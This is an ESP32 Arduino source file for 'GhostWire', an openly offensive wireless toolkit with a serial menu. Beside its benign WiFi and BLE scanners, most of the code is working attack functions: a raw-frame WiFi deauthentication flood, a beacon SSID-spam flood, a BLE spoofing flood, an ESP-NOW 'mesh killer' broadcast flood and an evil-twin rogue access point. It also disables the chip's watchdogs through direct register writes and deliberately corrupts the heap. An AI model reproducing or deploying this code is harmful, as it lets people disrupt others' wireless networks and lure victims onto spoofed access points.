#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEAdvertising.h>
#include <esp_system.h>
#include <esp_chip_info.h>
#include <esp_wifi.h>
#include <esp_now.h>
#include "soc/timer_group_reg.h"
#include "soc/rtc.h"
#include "esp_private/rtc_ctrl.h"

// ============================================================
// PROJECT METADATA
// ============================================================
#define GHOSTWIRE_NAME    "GhostWire"
#define GHOSTWIRE_VERSION "2.2.0"
#define GHOSTWIRE_AUTHOR  "Mayank Malaviya aka AIwolfie"
#define GHOSTWIRE_TAGLINE "ESP32 Offensive Security Toolkit"
#define GHOSTWIRE_BOARD   "ESP32-WROOM"
#define GHOSTWIRE_YEAR    "2026"

// ============================================================
// FORWARD DECLARATIONS
// ============================================================
void printBanner();
void printMenu();
void handleChoice(int choice);
void wifiScan();
String wifiSecurity(wifi_auth_mode_t type);
void bleScan(int seconds);
void chipInfo();
void memFlashInfo();
void systemStatus();
void initBLE();
void deauthAttack(uint8_t* targetMAC, uint8_t* bssid, int count);
void startBLESpoof(char* targetDeviceName);
void espNowDeauthRelay();
void killWatchdogs();
void pwnBeaconFlood();
void rogueAP();
void bleAddressRandomizer();
void heapCorruptionTrigger();

// ============================================================
// BLE CALLBACK CLASS
// ============================================================
class GhostWireBLECallback : public BLEAdvertisedDeviceCallbacks {
private:
  int count = 0;

public:
  void resetCount() { count = 0; }
  int getCount() const { return count; }

  void onResult(BLEAdvertisedDevice advertisedDevice) override {
    count++;
    Serial.println();
    Serial.printf("[%02d] %s\n", count, advertisedDevice.getAddress().toString().c_str());
    Serial.printf("     RSSI : %d dBm\n", advertisedDevice.getRSSI());
    if (advertisedDevice.haveName() && advertisedDevice.getName().length() > 0) {
      Serial.printf("     Name : %s\n", advertisedDevice.getName().c_str());
    } else {
      Serial.println("     Name : Unknown");
    }
    if (advertisedDevice.haveServiceUUID()) {
      Serial.printf("     UUID : %s\n", advertisedDevice.getServiceUUID().toString().c_str());
    }
  }
};

// ============================================================
// GLOBALS
// ============================================================
BLEScan* pBLEScan = nullptr;
BLEAdvertising* pAdvertising = nullptr;
static GhostWireBLECallback bleCallback;
bool promiscuousMode = false;

// ============================================================
// DEAUTH FRAME STRUCT
// ============================================================
typedef struct {
  uint8_t frameControl[2];
  uint8_t duration[2];
  uint8_t destMAC[6];
  uint8_t srcMAC[6];
  uint8_t bssid[6];
  uint8_t seqCtrl[2];
  uint8_t reasonCode[2];
} __attribute__((packed)) DeauthFrame;

// ============================================================
// ESP-NOW PACKET STRUCT
// ============================================================
typedef struct {
  uint8_t type;
  uint8_t payload[250];
} MeshPacket;

// ============================================================
// SETUP
// ============================================================
void setup() {
  Serial.begin(115200);
  Serial.setTimeout(100);
  delay(2000);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(200);
  killWatchdogs();
  printBanner();
  printMenu();
}

// ============================================================
// MAIN LOOP
// ============================================================
void loop() {
  if (Serial.available() > 0) {
    String input = Serial.readStringUntil('\n');
    input.trim();
    if (input.length() == 0) return;
    
    if (input.length() == 1) {
      char c = input[0];
      if (c >= '0' && c <= '9') {
        handleChoice(c - '0');
      } else if (c >= 'A' && c <= 'F') {
        handleChoice(10 + (c - 'A'));
      } else {
        Serial.println();
        Serial.println("[!] Invalid choice.");
        Serial.println("[*] Enter 0-9 or A-F.");
      }
    } else {
      Serial.println();
      Serial.println("[!] Invalid choice.");
      Serial.println("[*] Enter 0-9 or A-F.");
    }
    delay(300);
    printMenu();
  }
  delay(20);
}

// ============================================================
// BANNER
// ============================================================
void printBanner() {
  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|                                                      |");
  Serial.println("|                    G H O S T W I R E                 |");
  Serial.println("|                                                      |");
  Serial.println("|         ESP32 Offensive Security Toolkit             |");
  Serial.println("|                                                      |");
  Serial.println("+------------------------------------------------------+");
  Serial.println("|  WiFi  |  BLE  |  Exploit  |  Persistence            |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.println("  [ SYSTEM ONLINE - WATCHDOGS NEUTRALIZED ]");
  Serial.println();
  Serial.printf("  Device  : %s\n", GHOSTWIRE_BOARD);
  Serial.println("  Mode    : Red Team");
  Serial.println("  Serial  : 115200");
  Serial.printf("  Version : %s\n", GHOSTWIRE_VERSION);
  Serial.println();
  Serial.printf("  Created by: %s\n", GHOSTWIRE_AUTHOR);
  Serial.println("  [*] Use at your own risk. Authorized access only.");
}

// ============================================================
// MENU
// ============================================================
void printMenu() {
  Serial.println();
  Serial.println("--------------------------------------------------------");
  Serial.println("                  MAIN MENU - v2.2");
  Serial.println("--------------------------------------------------------");
  Serial.println();
  Serial.println("  WIRELESS DISCOVERY");
  Serial.println("    [1] WiFi Network Scan");
  Serial.println("    [2] BLE Scan - 10 seconds");
  Serial.println("    [3] BLE Scan - 30 seconds");
  Serial.println();
  Serial.println("  EXPLOIT / OFFENSIVE");
  Serial.println("    [4] Deauth Flood (WiFi disassociation)");
  Serial.println("    [5] BLE Spoof Flood");
  Serial.println("    [6] ESP-NOW Mesh Killer");
  Serial.println("    [7] Beacon Flood (SSID spam)");
  Serial.println("    [8] Rogue AP (Evil Twin)");
  Serial.println();
  Serial.println("  PERSISTENCE / HARDWARE");
  Serial.println("    [9] BLE Address Randomizer");
  Serial.println("    [A] Heap Corruption Trigger");
  Serial.println("    [B] Disable Watchdogs (already active)");
  Serial.println();
  Serial.println("  DEVICE INFO");
  Serial.println("    [C] Chip Information");
  Serial.println("    [D] Memory / Flash Information");
  Serial.println("    [E] System Status");
  Serial.println("    [0] Show Banner");
  Serial.println();
  Serial.println("--------------------------------------------------------");
  Serial.print("  GhostWire > Enter choice: ");
}

// ============================================================
// MENU HANDLER
// ============================================================
void handleChoice(int choice) {
  switch (choice) {
    case 0: printBanner(); break;
    case 1: wifiScan(); break;
    case 2: bleScan(10); break;
    case 3: bleScan(30); break;
    case 4: {
      Serial.println();
      Serial.println("[DEAUTH] Target AP MAC (format: AABBCCDDEEFF): ");
      String macStr = Serial.readStringUntil('\n');
      macStr.trim();
      if(macStr.length() == 12) {
        uint8_t bssid[6];
        for(int i=0; i<6; i++) {
          String byteStr = macStr.substring(i*2, i*2+2);
          bssid[i] = (uint8_t)strtol(byteStr.c_str(), NULL, 16);
        }
        Serial.println("[DEAUTH] Target STA MAC (format: AABBCCDDEEFF, or FF for broadcast): ");
        String staStr = Serial.readStringUntil('\n');
        staStr.trim();
        uint8_t target[6];
        if(staStr == "FF" || staStr == "ff") {
          memset(target, 0xFF, 6);
        } else if(staStr.length() == 12) {
          for(int i=0; i<6; i++) {
            String byteStr = staStr.substring(i*2, i*2+2);
            target[i] = (uint8_t)strtol(byteStr.c_str(), NULL, 16);
          }
        } else {
          Serial.println("[!] Invalid MAC. Using broadcast.");
          memset(target, 0xFF, 6);
        }
        Serial.println("[DEAUTH] Starting flood. 1000 packets.");
        deauthAttack(target, bssid, 1000);
      } else {
        Serial.println("[!] Invalid MAC format.");
      }
      break;
    }
    case 5: {
      Serial.println("[BLE SPOOF] Enter target device name: ");
      String name = Serial.readStringUntil('\n');
      name.trim();
      if(name.length() > 0) {
        char buf[64];
        name.toCharArray(buf, 64);
        startBLESpoof(buf);
      }
      break;
    }
    case 6: espNowDeauthRelay(); break;
    case 7: pwnBeaconFlood(); break;
    case 8: rogueAP(); break;
    case 9: bleAddressRandomizer(); break;
    case 10: heapCorruptionTrigger(); break;
    case 11: killWatchdogs(); break;
    case 12: chipInfo(); break;
    case 13: memFlashInfo(); break;
    case 14: systemStatus(); break;
    default: {
      Serial.println();
      Serial.println("[!] Invalid choice.");
      Serial.println("[*] Enter 0-9 or A-F.");
      break;
    }
  }
}

// ============================================================
// WIFI SCANNER
// ============================================================
void wifiScan() {
  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|                 WIFI NETWORK SCAN                    |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.println("[*] Initializing WiFi radio...");
  Serial.println("[*] Scanning 2.4 GHz channels...");

  WiFi.scanDelete();
  int networks = WiFi.scanNetworks(false, false, false, 300, 0);

  if (networks < 0) {
    Serial.println();
    Serial.println("[!] WiFi scan failed.");
    return;
  }
  if (networks == 0) {
    Serial.println();
    Serial.println("[-] No WiFi networks found.");
    WiFi.scanDelete();
    return;
  }

  Serial.println();
  Serial.println("[+] Scan complete");
  Serial.printf("[+] Networks found: %d\n", networks);
  Serial.println();
  Serial.println(" #   SSID                         CH     RSSI     SECURITY");
  Serial.println("------------------------------------------------------------");

  for (int i = 0; i < networks; i++) {
    String ssid = WiFi.SSID(i);
    int32_t rssi = WiFi.RSSI(i);
    int32_t channel = WiFi.channel(i);
    wifi_auth_mode_t encryption = WiFi.encryptionType(i);

    if (ssid.length() == 0) ssid = "<hidden>";
    if (ssid.length() > 28) ssid = ssid.substring(0, 25) + "...";

    char rssiStr[12];
    snprintf(rssiStr, sizeof(rssiStr), "%d dBm", rssi);

    Serial.printf("%2d   %-28s %-6d %-9s %s\n",
      i + 1,
      ssid.c_str(),
      channel,
      rssiStr,
      wifiSecurity(encryption).c_str()
    );
  }

  Serial.println("------------------------------------------------------------");
  WiFi.scanDelete();
  Serial.println();
  Serial.println("[+] WiFi scan complete.");
}

// ============================================================
// WIFI SECURITY
// ============================================================
String wifiSecurity(wifi_auth_mode_t type) {
  switch (type) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENT";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
    default: return "UNKNOWN";
  }
}

// ============================================================
// BLE INITIALIZATION
// ============================================================
void initBLE() {
  if (pBLEScan == nullptr) {
    BLEDevice::init("");
    pBLEScan = BLEDevice::getScan();
    if (pBLEScan == nullptr) return;
    pBLEScan->setAdvertisedDeviceCallbacks(&bleCallback, true);
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
  }
}

// ============================================================
// BLE SCANNER - FIXED FOR CORE 3.0.0
// ============================================================
void bleScan(int seconds) {
  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|                   BLE DISCOVERY                      |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.printf("[*] Scan duration : %d seconds\n", seconds);
  Serial.println("[*] BLE scanner   : Active");
  Serial.println("[*] Listening for advertisements...");

  initBLE();
  if (pBLEScan == nullptr) {
    Serial.println();
    Serial.println("[!] Failed to initialize BLE scanner.");
    return;
  }

  bleCallback.resetCount();
  
  BLEScanResults* results = pBLEScan->start(seconds, false);

  Serial.println();
  Serial.println("--------------------------------------------------------");
  Serial.println("[+] BLE scan complete");
  Serial.printf("[+] Devices discovered: %d\n", results->getCount());

  pBLEScan->clearResults();
}

// ============================================================
// DEAUTH FLOOD
// ============================================================
void deauthAttack(uint8_t* targetMAC, uint8_t* bssid, int count) {
  Serial.println();
  Serial.println("[DEAUTH] Starting deauthentication attack");
  Serial.printf("[DEAUTH] Target: %02X:%02X:%02X:%02X:%02X:%02X\n",
    targetMAC[0], targetMAC[1], targetMAC[2],
    targetMAC[3], targetMAC[4], targetMAC[5]);
  Serial.printf("[DEAUTH] BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
    bssid[0], bssid[1], bssid[2],
    bssid[3], bssid[4], bssid[5]);
  Serial.printf("[DEAUTH] Packets: %d\n", count);
  
  wifi_interface_t iface = WIFI_IF_STA;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  promiscuousMode = true;
  
  DeauthFrame frame;
  frame.frameControl[0] = 0xC0;
  frame.frameControl[1] = 0x00;
  frame.duration[0] = 0x00;
  frame.duration[1] = 0x00;
  memcpy(frame.destMAC, targetMAC, 6);
  memcpy(frame.srcMAC, bssid, 6);
  memcpy(frame.bssid, bssid, 6);
  frame.seqCtrl[0] = 0x00;
  frame.seqCtrl[1] = 0x00;
  frame.reasonCode[0] = 0x07;
  frame.reasonCode[1] = 0x00;
  
  for(int i = 0; i < count; i++) {
    esp_wifi_80211_tx(iface, (uint8_t*)&frame, sizeof(frame), false);
    if(i % 100 == 0) {
      Serial.printf("[DEAUTH] Sent %d packets\n", i);
    }
    delay(1);
  }
  
  esp_wifi_set_promiscuous(false);
  promiscuousMode = false;
  Serial.println("[DEAUTH] Attack complete.");
}

// ============================================================
// BLE SPOOF FLOOD - FIXED STRING CONVERSION
// ============================================================
void startBLESpoof(char* targetDeviceName) {
  Serial.println();
  Serial.printf("[BLE SPOOF] Targeting device: %s\n", targetDeviceName);
  Serial.println("[BLE SPOOF] Sending malformed connection requests...");
  
  if(pAdvertising == nullptr) {
    BLEDevice::init("GHOSTWIRE_SPOOF");
    pAdvertising = BLEDevice::getAdvertising();
  }
  
  uint8_t spoofPayload[31];
  memset(spoofPayload, 0xFF, 31);
  
  BLEAdvertisementData advData;
  advData.setName(targetDeviceName);
  
  String payloadStr = String((char*)spoofPayload, 31);
  advData.setManufacturerData(payloadStr);
  
  for(int i = 0; i < 5000; i++) {
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    delay(5);
    pAdvertising->stop();
    if(i % 500 == 0) {
      Serial.printf("[BLE SPOOF] Sent %d spoofs\n", i);
    }
  }
  Serial.println("[BLE SPOOF] Flood complete.");
}

// ============================================================
// ESP-NOW DEAUTH RELAY - NO CALLBACK VERSION
// ============================================================
void espNowDeauthRelay() {
  Serial.println();
  Serial.println("[ESP-NOW] Initializing mesh killer...");
  
  if(esp_now_init() != ESP_OK) {
    Serial.println("[ESP-NOW] Init failed.");
    return;
  }
  
  MeshPacket packet;
  packet.type = 0x01;
  memset(packet.payload, 0xAA, 250);
  
  uint8_t broadcastMAC[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  
  for(int i = 0; i < 500; i++) {
    esp_now_send(broadcastMAC, (uint8_t*)&packet, sizeof(packet));
    if(i % 100 == 0) {
      Serial.printf("[ESP-NOW] Sent %d packets\n", i);
    }
    delay(5);
  }
  
  esp_now_deinit();
  Serial.println("[ESP-NOW] Mesh kill complete.");
}

// ============================================================
// WATCHDOG KILL - DIRECT REGISTER VERSION (NO HAL DEPENDENCIES)
// ============================================================
void killWatchdogs() {
  Serial.println("[WATCHDOG] Disabling all timers...");
  
  // TG0 Watchdog
  WRITE_PERI_REG(0x3FF5F000 + 0x48, 0x50D83AA1);  // WDT_WPROTECT key
  WRITE_PERI_REG(0x3FF5F000 + 0x1C, 0x0);          // WDT_CONFIG0 - disable
  WRITE_PERI_REG(0x3FF5F000 + 0x20, 0x0);          // WDT_CONFIG1
  WRITE_PERI_REG(0x3FF5F000 + 0x24, 0x0);          // WDT_CONFIG2
  WRITE_PERI_REG(0x3FF5F000 + 0x48, 0x0);          // WDT_WPROTECT lock
  
  // TG1 Watchdog
  WRITE_PERI_REG(0x3FF60000 + 0x48, 0x50D83AA1);   // WDT_WPROTECT key
  WRITE_PERI_REG(0x3FF60000 + 0x1C, 0x0);           // WDT_CONFIG0 - disable
  WRITE_PERI_REG(0x3FF60000 + 0x20, 0x0);           // WDT_CONFIG1
  WRITE_PERI_REG(0x3FF60000 + 0x24, 0x0);           // WDT_CONFIG2
  WRITE_PERI_REG(0x3FF60000 + 0x48, 0x0);           // WDT_WPROTECT lock
  
  // RTC Watchdog
  WRITE_PERI_REG(0x3FF48000 + 0x60, 0x0);  // WDTCONFIG0 - disable
  WRITE_PERI_REG(0x3FF48000 + 0x64, 0x0);  // WDTCONFIG1
  WRITE_PERI_REG(0x3FF48000 + 0x68, 0x0);  // WDTCONFIG2
  WRITE_PERI_REG(0x3FF48000 + 0x6C, 0x0);  // WDTCONFIG3
  WRITE_PERI_REG(0x3FF48000 + 0x70, 0x0);  // WDTCONFIG4
  WRITE_PERI_REG(0x3FF48000 + 0x60, 0x0);  // Double-tap
  
  // Feed to clear
  WRITE_PERI_REG(0x3FF5F000 + 0x18, 0x1);  // WDT_FEED TG0
  WRITE_PERI_REG(0x3FF60000 + 0x18, 0x1);  // WDT_FEED TG1
  WRITE_PERI_REG(0x3FF48000 + 0x5C, 0x1);  // WDT_FEED RTC
  
  Serial.println("[WATCHDOG] All timers neutralized.");
}

// ============================================================
// BEACON FLOOD (SSID SPAM)
// ============================================================
void pwnBeaconFlood() {
  Serial.println();
  Serial.println("[BEACON] Starting SSID flood...");
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  
  uint8_t beacon[128];
  memset(beacon, 0, 128);
  
  beacon[0] = 0x80;
  beacon[1] = 0x00;
  beacon[2] = 0x00;
  beacon[3] = 0x00;
  memset(&beacon[4], 0xFF, 6);
  for(int i=0; i<6; i++) beacon[10+i] = esp_random() & 0xFF;
  memcpy(&beacon[16], &beacon[10], 6);
  beacon[22] = 0x00;
  beacon[23] = 0x00;
  beacon[24] = 0x00;
  beacon[25] = 0x00;
  beacon[26] = 0x00;
  beacon[27] = 0x00;
  beacon[28] = 0x00;
  beacon[29] = 0x00;
  beacon[30] = 0x00;
  beacon[31] = 0x00;
  beacon[32] = 0x64;
  beacon[33] = 0x00;
  beacon[34] = 0x11;
  beacon[35] = 0x00;
  beacon[36] = 0x06;
  
  for(int i = 0; i < 2000; i++) {
    int len = (esp_random() % 10) + 3;
    beacon[36] = len;
    for(int j=0; j<len; j++) {
      beacon[37+j] = 'A' + (esp_random() % 26);
    }
    beacon[22] = (esp_random() & 0xFF);
    beacon[23] = (esp_random() & 0xFF);
    
    int frameLen = 37 + len;
    esp_wifi_80211_tx(WIFI_IF_STA, beacon, frameLen, false);
    
    if(i % 100 == 0) {
      Serial.printf("[BEACON] Sent %d beacons\n", i);
    }
    delay(1);
  }
  
  esp_wifi_set_promiscuous(false);
  Serial.println("[BEACON] Flood complete.");
}

// ============================================================
// ROGUE AP (EVIL TWIN)
// ============================================================
void rogueAP() {
  Serial.println();
  Serial.println("[ROGUE] Starting Rogue AP...");
  Serial.println("[ROGUE] Enter SSID to clone: ");
  String ssid = Serial.readStringUntil('\n');
  ssid.trim();
  if(ssid.length() == 0) ssid = "EvilTwin";
  
  Serial.println("[ROGUE] Enter channel (1-11): ");
  String chStr = Serial.readStringUntil('\n');
  chStr.trim();
  int channel = chStr.toInt();
  if(channel < 1 || channel > 11) channel = 6;
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid.c_str(), "password", channel, 0, 1);
  
  Serial.printf("[ROGUE] AP: %s | Channel: %d | Hidden: No\n", ssid.c_str(), channel);
  Serial.printf("[ROGUE] MAC: %s\n", WiFi.softAPmacAddress().c_str());
  Serial.println("[ROGUE] AP running. Connect with password: password");
  Serial.println("[ROGUE] Press any key to stop...");
  
  while(!Serial.available()) {
    delay(1000);
    Serial.print(".");
  }
  Serial.read();
  
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  Serial.println("[ROGUE] AP stopped.");
}

// ============================================================
// BLE ADDRESS RANDOMIZER
// ============================================================
void bleAddressRandomizer() {
  Serial.println();
  Serial.println("[BLE ADDR] Randomizing BLE MAC address...");
  
  BLEDevice::init("GHOSTWIRE_RAND");
  uint8_t newAddr[6];
  for(int i=0; i<6; i++) newAddr[i] = esp_random() & 0xFF;
  newAddr[0] &= 0xFC;
  
  esp_bd_addr_t addr;
  memcpy(addr, newAddr, 6);
  esp_ble_gap_set_rand_addr(addr);
  
  Serial.printf("[BLE ADDR] New MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
    newAddr[0], newAddr[1], newAddr[2],
    newAddr[3], newAddr[4], newAddr[5]);
  Serial.println("[BLE ADDR] Randomization complete.");
}

// ============================================================
// HEAP CORRUPTION TRIGGER
// ============================================================
void heapCorruptionTrigger() {
  Serial.println();
  Serial.println("[HEAP] Triggering heap corruption...");
  
  uint32_t* ptr = (uint32_t*)malloc(1024);
  if(ptr != nullptr) {
    for(int i = 0; i < 2048; i++) {
      ptr[i] = 0xDEADBEEF;
    }
    free(ptr);
  }
  
  uint32_t* ptr2 = (uint32_t*)malloc(512);
  if(ptr2 != nullptr) {
    free(ptr2);
    free(ptr2);
  }
  
  uint32_t* ptr3 = (uint32_t*)malloc(256);
  if(ptr3 != nullptr) {
    free(ptr3);
    ptr3[0] = 0x41414141;
  }
  
  Serial.println("[HEAP] Corruption triggered.");
  Serial.println("[HEAP] System may crash or behave erratically.");
}

// ============================================================
// CHIP INFORMATION
// ============================================================
void chipInfo() {
  esp_chip_info_t info;
  esp_chip_info(&info);

  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|                 CHIP INFORMATION                     |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.print("Model          : ");
  switch (info.model) {
    case CHIP_ESP32: Serial.println("ESP32"); break;
    case CHIP_ESP32S2: Serial.println("ESP32-S2"); break;
    case CHIP_ESP32S3: Serial.println("ESP32-S3"); break;
    case CHIP_ESP32C3: Serial.println("ESP32-C3"); break;
    default: Serial.println("Other ESP32 family"); break;
  }
  Serial.printf("Revision       : %d\n", info.revision);
  Serial.printf("CPU Cores      : %d\n", info.cores);
  Serial.printf("CPU Frequency  : %u MHz\n", ESP.getCpuFreqMHz());
  Serial.printf("SDK Version    : %s\n", ESP.getSdkVersion());
  Serial.printf("MAC Address    : %s\n", WiFi.macAddress().c_str());
  Serial.println();
  Serial.printf("WiFi           : %s\n", (info.features & CHIP_FEATURE_WIFI_BGN) ? "Available" : "Not available");
  Serial.printf("Bluetooth      : %s\n", (info.features & CHIP_FEATURE_BT) ? "Available" : "Not available");
  Serial.printf("BLE            : %s\n", (info.features & CHIP_FEATURE_BLE) ? "Available" : "Not available");
}

// ============================================================
// MEMORY / FLASH INFORMATION
// ============================================================
void memFlashInfo() {
  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|              MEMORY / FLASH STATUS                   |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.printf("Heap Total          : %u KB\n", ESP.getHeapSize() / 1024);
  Serial.printf("Heap Free           : %u KB\n", ESP.getFreeHeap() / 1024);
  Serial.printf("Minimum Heap        : %u KB\n", ESP.getMinFreeHeap() / 1024);
  Serial.printf("Largest Free Block  : %u KB\n", ESP.getMaxAllocHeap() / 1024);
  Serial.println();
  if (psramFound() && ESP.getPsramSize() > 0) {
    Serial.printf("PSRAM Total         : %u KB\n", ESP.getPsramSize() / 1024);
    Serial.printf("PSRAM Free          : %u KB\n", ESP.getFreePsram() / 1024);
  } else {
    Serial.println("PSRAM Total         : Not available");
    Serial.println("PSRAM Free          : Not available");
  }
  Serial.println();
  Serial.printf("Flash Size          : %u MB\n", ESP.getFlashChipSize() / (1024 * 1024));
  Serial.printf("Flash Speed         : %u MHz\n", ESP.getFlashChipSpeed() / 1000000);
  Serial.println();
  Serial.printf("Sketch Size         : %u KB\n", ESP.getSketchSize() / 1024);
  Serial.printf("Free Sketch Space   : %u KB\n", ESP.getFreeSketchSpace() / 1024);
  Serial.println();
  Serial.printf("Uptime              : %lu seconds\n", millis() / 1000);
}

// ============================================================
// SYSTEM STATUS
// ============================================================
void systemStatus() {
  unsigned long totalSeconds = millis() / 1000;
  unsigned int hours = totalSeconds / 3600;
  unsigned int minutes = (totalSeconds % 3600) / 60;
  unsigned int seconds = totalSeconds % 60;

  Serial.println();
  Serial.println("+------------------------------------------------------+");
  Serial.println("|                   SYSTEM STATUS                      |");
  Serial.println("+------------------------------------------------------+");
  Serial.println();
  Serial.printf("Project       : %s\n", GHOSTWIRE_NAME);
  Serial.printf("Version       : %s\n", GHOSTWIRE_VERSION);
  Serial.printf("Author        : %s\n", GHOSTWIRE_AUTHOR);
  Serial.printf("Platform      : %s\n", GHOSTWIRE_BOARD);
  Serial.println();
  Serial.printf("WiFi          : %s\n", (WiFi.getMode() != WIFI_OFF) ? "Ready" : "Offline");
  Serial.printf("BLE           : %s\n", (pBLEScan != nullptr) ? "Ready" : "Uninitialized");
  Serial.printf("Promiscuous   : %s\n", promiscuousMode ? "Active" : "Inactive");
  Serial.println();
  Serial.printf("Uptime        : %02u:%02u:%02u\n", hours, minutes, seconds);
  Serial.printf("Free Heap     : %u KB\n", ESP.getFreeHeap() / 1024);
  Serial.printf("Flash         : %u MB\n", ESP.getFlashChipSize() / (1024 * 1024));
}
